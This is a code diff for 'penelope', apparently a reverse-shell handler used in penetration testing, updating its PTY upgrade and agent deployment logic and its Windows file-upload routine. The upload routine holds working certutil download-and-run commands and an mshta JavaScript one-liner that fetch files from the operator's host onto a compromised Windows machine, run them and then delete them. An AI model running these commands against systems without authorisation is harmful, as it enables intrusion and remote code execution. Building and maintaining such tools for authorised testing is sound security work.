@@ -16,11 +16,12 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.11.9"
+__version__ = "0.11.10"
 
 import os
 import io
 import re
+import pwd
 import sys
 import tty
 import cmd
@@ -2131,35 +2132,33 @@ class Session:
 		return self.need_binary(name, url)
 
 	def upgrade(self):
+		if self.agent:
+			logger.warning("PTY agent is already deployed")
+			return False
 
-		if self.type == 'PTY':
-			if self.agent:
-				logger.warning("The shell is already PTY...")
-				return False
-			else:
-				self.bypass_control_session = True
-				deploy_agent = self.bin['python3'] or self.bin['python']
-				self.bypass_control_session = False
-				if deploy_agent:
-					logger.info("Attempting to deploy agent...")
-				else:
-					return False
+		self.bypass_control_session = True
+		deploy_agent = (self.bin['python3'] or self.bin['python']) and not Path(self.directory / ".noagent").exists()
+		self.bypass_control_session = False
+
+		if self.type == "PTY":
+			if deploy_agent:
+				logger.info("Attempting to deploy agent...")
+			#else:
+			#	return False
 		else:
 			logger.info("Attempting to upgrade shell to PTY...")
 
 		if self.OS == "Unix":
-			deploy_agent = False
-
 			self.bypass_control_session = True
 			self.shell = self.bin['bash'] if self.bin['bash'] else self.bin['sh']
 			self.bypass_control_session = False
+
 			if not self.shell:
 				logger.warning("Cannot detect shell. Abort upgrading...")
 				return False
 
 			socat_cmd = f"{{}} - exec:{self.shell},pty,stderr,setsid,sigint,sane;exit 0"
-
-			if self.bin['python3'] or self.bin['python']:
+			if deploy_agent:
 				if self.bin['python3']:
 					_bin = self.bin['python3']
 					_decode = 'b64decode'
@@ -2213,7 +2212,9 @@ class Session:
 			if not deploy_agent and not self.spare_control_sessions: #### TODO
 				logger.warning("Agent cannot be deployed. I need to maintain at least one basic session...")
 				core.session_wait_host = self.name
+				self.bypass_control_session = True
 				self.spawn()
+				self.bypass_control_session = False
 
 				try:
 					new_session = core.sessions[core.session_wait.get(timeout=options.short_timeout)]
@@ -2223,9 +2224,10 @@ class Session:
 					logger.error("Failed spawning new session")
 					return False
 
-				new_session.upgrade()
-				if caller() == 'attach':
-					new_session.attach()
+				if not self.type == "PTY":
+					new_session.upgrade()
+					if caller() == 'attach':
+						new_session.attach()
 
 				return False
 
@@ -2249,7 +2251,8 @@ class Session:
 			response = self.exec(f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}', separate=deploy_agent, expect=expect, raw=True)
 			self.bypass_control_session = False
 			if not isinstance(response, bytes):
-				logger.error("The shell became unresponsive. I am killing it...")
+				logger.error("The shell became unresponsive. I am killing it, sorry... Next time I will not try to deploy agent")
+				Path(self.directory / ".noagent").touch()
 				self.kill()
 				return False
 
@@ -2639,6 +2642,8 @@ class Session:
 					resolved_items.extend(items)
 				else:
 					logger.error(f"No such file or directory: {item}")
+		if not resolved_items:
+			return []
 
 		#item = os.path.expanduser(item) # TOCHECK
 
@@ -2802,8 +2807,8 @@ class Session:
 			tmp_escaped = self.exec("echo %TEMP%", value=True).replace('\\', '\\\\')
 			temp_remote_file_zip = urlpath_zip.split("/")[-1]
 
-			fetch_cmd = f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_zip}" "%TEMP%\\{temp_remote_file_zip}"'
-			unzip_cmd = f'mshta "javascript:var sh=new ActiveXObject(\'shell.application\'); var fso = new ActiveXObject(\'Scripting.FileSystemObject\'); sh.Namespace(\'{cwd_escaped}\').CopyHere(sh.Namespace(\'{tmp_escaped}\\\\{temp_remote_file_zip}\').Items(), 16); while(sh.Busy) {{WScript.Sleep(100);}} fso.DeleteFile(\'{tmp_escaped}\\\\{temp_remote_file_zip}\');close()"'
+			fetch_cmd = f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_zip}" "%TEMP%\\{temp_remote_file_zip}" && echo DOWNLOAD OK'
+			unzip_cmd = f'mshta "javascript:var sh=new ActiveXObject(\'shell.application\'); var fso = new ActiveXObject(\'Scripting.FileSystemObject\'); sh.Namespace(\'{cwd_escaped}\').CopyHere(sh.Namespace(\'{tmp_escaped}\\\\{temp_remote_file_zip}\').Items(), 16); while(sh.Busy) {{WScript.Sleep(100);}} fso.DeleteFile(\'{tmp_escaped}\\\\{temp_remote_file_zip}\');close()" && echo UNZIP OK'
 
 			with open(tempfile_bat, "w") as f:
 				f.write(fetch_cmd + "\n")
@@ -2816,6 +2821,8 @@ class Session:
 				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}"&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
 				value=True, timeout=None)
 			server.stop()
+			if "DOWNLOAD OK" in response and "UNZIP OK" in response:
+				logger.info("Upload successful!") # TODO
 
 	def script(self, local_script):
 		if not self.agent:
@@ -3956,6 +3963,9 @@ BINARIES = {
 }
 
 # INITIALIZATION
+GID = int(os.environ.get('SUDO_GID', os.getgid()))
+os.setgid(GID)
+os.umask(0o007)
 signal.signal(signal.SIGINT, ControlC)
 signal.signal(signal.SIGWINCH, WinResize)
 try:
@@ -3972,6 +3982,7 @@ class Options:
 	log_levels = {"silent":'WARNING', "debug":'DEBUG'}
 
 	def __init__(self):
+		self.basedir = Path(pwd.getpwuid(GID).pw_dir) / f'.{__program__}'
 		self.default_listener_port = 4444
 		self.default_interface = "0.0.0.0"
 		self.latency = .01
@@ -3986,7 +3997,6 @@ class Options:
 		self.upload_chunk_size = 51200
 		self.download_chunk_size = 1048576
 		self.escape = {'sequence':b'\x1b[24~', 'key':'F12'}
-		self.basedir = Path.home() / f'.{__program__}'
 		self.logfile = f"{__program__}.log"
 		self.debug_logfile = "debug.log"
 		self.cmd_histfile = 'cmd_history'
@@ -4025,6 +4035,7 @@ class Options:
 				}
 			}
 		}
+
 		self.configfile = self.basedir / 'penelope.conf'
 
 	def __getattribute__(self, option):
